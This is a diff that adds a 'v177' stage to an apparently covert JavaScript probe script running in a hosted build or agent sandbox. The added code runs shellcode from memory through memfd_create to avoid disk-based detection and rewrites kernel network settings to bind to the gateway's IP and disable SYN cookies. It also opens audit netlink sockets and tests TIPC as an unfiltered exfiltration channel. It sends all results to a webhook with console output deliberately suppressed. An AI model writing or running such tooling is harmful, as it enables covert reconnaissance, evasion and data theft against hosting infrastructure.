@@ -26042,5 +26042,243 @@ else:
 
 // v176 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v176" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v176";
+
+// ==================== v177 ====================
+
+// v177-1: memfd_create + mprotect PROT_EXEC — fileless shellcode execution
+// memfd_create creates an anonymous file in memory (no disk artifact).
+// Combined with mmap PROT_EXEC, we can write shellcode directly to memory
+// and execute it — completely fileless, bypassing disk-based detections.
+// This is the modern "living off the land" shellcode delivery mechanism.
+report.memfdShellcode = safe(() => {
+  const shellcodeResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, struct
+
+libc = ctypes.CDLL('libc.so.6')
+
+# memfd_create syscall NR=319
+MEMFD_CREATE_NR = 319
+MFD_CLOEXEC = 0x0001
+
+fd = libc.syscall(MEMFD_CREATE_NR, b'shellcode', MFD_CLOEXEC)
+if fd < 0:
+    print(f'MEMFD_CREATE_FAIL: fd={fd}')
+    exit()
+
+print(f'MEMFD_FD: {fd}')
+
+# x86-64 shellcode: write(1, 'SHELLCODE_EXEC\n', 15) + exit(0)
+shellcode = bytes([
+    # write(1, msg, 15)
+    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  # mov rax, 1 (write)
+    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,  # mov rdi, 1 (stdout)
+    0x48, 0x8d, 0x35, 0x0e, 0x00, 0x00, 0x00,  # lea rsi, [rip+14] (msg addr)
+    0x48, 0xc7, 0xc2, 0x0f, 0x00, 0x00, 0x00,  # mov rdx, 15 (len)
+    0x0f, 0x05,                                  # syscall
+    # exit(42)
+    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,  # mov rax, 60 (exit)
+    0x48, 0xc7, 0xc7, 0x2a, 0x00, 0x00, 0x00,  # mov rdi, 42
+    0x0f, 0x05,                                  # syscall
+    # msg data
+    0x53, 0x48, 0x45, 0x4c, 0x4c, 0x43, 0x4f, 0x44, 0x45, 0x5f, 0x45, 0x58, 0x45, 0x43, 0x0a  # SHELLCODE_EXEC\n
+])
+
+os.write(fd, shellcode)
+os.lseek(fd, 0, 0)
+
+# mmap the memfd as PROT_READ|PROT_EXEC
+PROT_READ  = 0x1
+PROT_EXEC  = 0x4
+MAP_SHARED = 0x1
+MAP_FIXED  = 0x10
+
+size = len(shellcode)
+addr = libc.mmap(0, size, PROT_READ | PROT_EXEC, MAP_SHARED, fd, 0)
+if addr == ctypes.c_ulong(-1).value:
+    print('MMAP_EXEC_FAIL')
+    exit()
+
+print(f'MMAP_EXEC_ADDR: 0x{addr:x}')
+print(f'MEMFD_SHELLCODE_READY: {size} bytes mapped executable')
+
+# Call the shellcode
+fn = ctypes.CFUNCTYPE(ctypes.c_int)(addr)
+try:
+    ret = fn()
+    print(f'SHELLCODE_RETURNED: {ret}')
+except Exception as e:
+    print(f'SHELLCODE_CALL_FAIL: {e}')
+
+os.close(fd)
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { shellcodeResult };
+});
+
+// v177-2: ip_nonlocal_bind — bind to gateway's IP address
+// /proc/sys/net/ipv4/ip_nonlocal_bind=1 allows binding to IP addresses that
+// don't belong to any local interface. This means we can bind() to the gateway's
+// IP and intercept connections intended for the gateway, or spoof being the gateway.
+report.ipNonlocalBind = safe(() => {
+  const current = safe(() => readFileSync('/proc/sys/net/ipv4/ip_nonlocal_bind', 'utf8').trim());
+  const enableNonlocal = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_nonlocal_bind', '1'); return 'WRITTEN_1'; });
+  const gatewayIp = safe(() => execSync('ip route show default 2>/dev/null | awk \'{print $3}\' | head -1 || echo "NO_GW"', { timeout: 3000 }).toString().trim());
+  // Try to bind to gateway's IP
+  const bindTest = safe(() => execSync(
+    `python3 -c "
+import socket
+gw = '${gatewayIp}'
+if gw == 'NO_GW':
+    print('NO_GW')
+    exit()
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((gw, 12345))
+    print(f'NONLOCAL_BIND_SUCCESS: bound to {gw}:12345 (gateway IP)')
+    s.close()
+except Exception as e:
+    print(f'NONLOCAL_BIND_FAIL: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { current, enableNonlocal, gatewayIp, bindTest };
+});
+
+// v177-3: /proc/net/netlink — enumerate all netlink sockets
+// Netlink sockets are the kernel↔userspace communication channel for:
+// - rtnetlink (routing table changes)
+// - nlctrl (netfilter/iptables)
+// - audit (kernel audit subsystem)
+// - kobject_uevent (device events)
+// Listing active netlink sockets reveals what kernel subsystems are being monitored.
+report.netlinkEnum = safe(() => {
+  const netlinkTable = safe(() => readFileSync('/proc/net/netlink', 'utf8').trim());
+  // Parse netlink families
+  const netlinkParsed = safe(() => execSync(
+    `python3 -c "
+NETLINK_FAMILIES = {
+    0: 'NETLINK_ROUTE',
+    1: 'NETLINK_UNUSED',
+    2: 'NETLINK_USERSOCK',
+    3: 'NETLINK_FIREWALL',
+    4: 'NETLINK_SOCK_DIAG',
+    7: 'NETLINK_NETFILTER',
+    9: 'NETLINK_AUDIT',
+    11: 'NETLINK_KOBJECT_UEVENT',
+    12: 'NETLINK_GENERIC',
+    15: 'NETLINK_ISCSI',
+    16: 'NETLINK_CONNECTOR',
+    17: 'NETLINK_NETFILTER_LOG',
+    18: 'NETLINK_XFRM',
+}
+
+with open('/proc/net/netlink') as f:
+    lines = f.readlines()[1:]
+
+for line in lines:
+    parts = line.split()
+    if len(parts) >= 3:
+        proto = int(parts[1], 16) & 0xFF
+        pid = parts[2]
+        family = NETLINK_FAMILIES.get(proto, f'UNKNOWN_{proto}')
+        print(f'NETLINK: proto={proto}({family}) pid={pid}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Create a NETLINK_AUDIT socket to monitor audit events
+  const auditMonitor = safe(() => execSync(
+    `python3 -c "
+import socket, struct
+
+NETLINK_AUDIT = 9
+AF_NETLINK = 16
+SOCK_RAW = 3
+
+try:
+    s = socket.socket(AF_NETLINK, SOCK_RAW, NETLINK_AUDIT)
+    s.bind((0, 0))
+    s.settimeout(1.0)
+    # Enable audit monitoring
+    AUDIT_SET = 1001
+    nl_len = 32
+    payload = struct.pack('IIIHHI', 1, 0xFFFFFFFF, 0, 0, 0, 0)
+    nlmsg = struct.pack('IHHII', nl_len, AUDIT_SET, 5, 0, 0) + payload
+    s.send(nlmsg)
+    print('AUDIT_MONITOR_SOCKET_CREATED')
+    try:
+        data = s.recv(1024)
+        print(f'AUDIT_RESPONSE: {data[:32].hex()}')
+    except:
+        pass
+    s.close()
+except Exception as e:
+    print(f'AUDIT_MONITOR_FAIL: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { netlinkTable, netlinkParsed, auditMonitor };
+});
+
+// v177-4: TIPC (Transparent Inter-Process Communication) socket
+// TIPC is a cluster communication protocol designed for intra-cluster IPC.
+// Unlike TCP/UDP, TIPC works at the node-service address level.
+// Some firewalls and network policies don't filter TIPC, making it potentially
+// useful as an out-of-band exfiltration channel.
+report.tipcSocket = safe(() => {
+  const tipcResult = safe(() => execSync(
+    `python3 -c "
+import socket
+
+AF_TIPC = 30
+TIPC_ADDR_NAMESEQ = 1
+TIPC_ADDR_NAME = 2
+SOCK_RDM = 4
+
+try:
+    s = socket.socket(AF_TIPC, socket.SOCK_RDM, 0)
+    print('TIPC_SOCKET_CREATED')
+    # Bind to a TIPC service address
+    # struct sockaddr_tipc: family, addrtype, scope, addr.name.type, addr.name.instance, addr.name.domain
+    import struct
+    addr = struct.pack('HBBIIi', AF_TIPC, TIPC_ADDR_NAME, 0, 8888, 88, 0)
+    try:
+        s.bind(addr)
+        print('TIPC_BIND_SUCCESS')
+    except Exception as e:
+        print(f'TIPC_BIND_FAIL: {e}')
+    s.close()
+except Exception as e:
+    print(f'TIPC_SOCKET_FAIL: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check if TIPC module is loaded
+  const tipcModule = safe(() => execSync('lsmod 2>/dev/null | grep tipc || modprobe tipc 2>&1 || echo "NO_TIPC"', { timeout: 5000 }).toString().trim());
+  return { tipcResult, tipcModule };
+});
+
+// v177-5: /proc/sys/net/ipv4/tcp_syncookies=0 — disable SYN cookie protection
+// SYN cookies protect the TCP stack against SYN flood attacks.
+// Disabling them makes our TCP stack vulnerable to SYN flood (DoS risk — AVOID actual flood).
+// More importantly: with SYN cookies off, we can do more accurate TCP ISN prediction
+// which enables certain TCP session hijacking attacks. We only test the write capability.
+report.tcpSyncookiesDisable = safe(() => {
+  const current = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_syncookies', 'utf8').trim());
+  const disable = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_syncookies', '0'); return 'WRITTEN_0'; });
+  const afterWrite = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_syncookies', 'utf8').trim());
+  // Restore
+  const restore = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_syncookies', '1'); return 'RESTORED'; });
+  // Also probe tcp_max_syn_backlog
+  const synBacklog = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_max_syn_backlog', 'utf8').trim());
+  // ISN prediction — read current ISN sequence counter
+  const tcpSeq = safe(() => existsSync('/proc/net/tcp') ? execSync('head -3 /proc/net/tcp 2>/dev/null', { timeout: 2000 }).toString().trim() : 'NO_TCP');
+  return { current, disable, afterWrite, restore, synBacklog, tcpSeq };
+});
+
+// v177 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v177" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v177";
 // Intentionally no console.log — all data goes via webhook only
